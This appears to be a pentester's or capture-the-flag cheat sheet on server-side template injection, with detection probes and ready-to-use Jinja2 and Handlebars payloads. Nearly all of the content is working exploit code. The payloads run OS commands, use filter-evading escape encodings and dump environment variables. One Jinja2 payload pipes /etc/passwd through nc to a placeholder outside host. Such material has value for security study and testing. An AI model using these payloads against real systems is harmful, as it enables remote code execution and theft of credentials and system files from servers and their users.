# Template Injection
https://portswigger.net/web-security/server-side-template-injection
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
## Detect
To detect template injection start with following
```
{{7*'7'}
{{7*'7'}}
```
https://portswigger.net/web-security/images/template-decision-tree.png

## Exploitation
### Jinja2
https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/

```python
{{"".__class__.__mro__[1].__subclasses__()[186].__init__.__globals__["__builtins__"]["__import__"]("os").popen("cat flag.txt").read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']()}}
{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']()}}
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}

# Reverse shell with Jinja2 injection
{% if request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat /etc/passwd | nc HOSTNAME 1337')['read']() == 'chiv' %} a {% endif %}
```
### handlebars
https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit

https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/JavaScript.md#handlebars
```
{{#with this as |obj|}}
    {{#with (obj.constructor.keys "1") as |arr|}}
        {{#with obj.constructor.name as |str|}}
            {{#blockHelperMissing str.toString}}
              {{#with (arr.constructor (str.toString.bind "return JSON.stringify(process.env);"))}}
                  {{#with (obj.constructor.getOwnPropertyDescriptor this 0)}}
                      {{#with (obj.constructor.defineProperty obj.constructor.prototype "toString" this)}}
                          {{#with (obj.constructor.constructor "test")}}
                            {{this}}
                          {{/with}}
                      {{/with}}
                  {{/with}}
              {{/with}}
            {{/blockHelperMissing}}
        {{/with}}
  {{/with}}
{{/with}}
```
```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```
```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process').execSync('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```
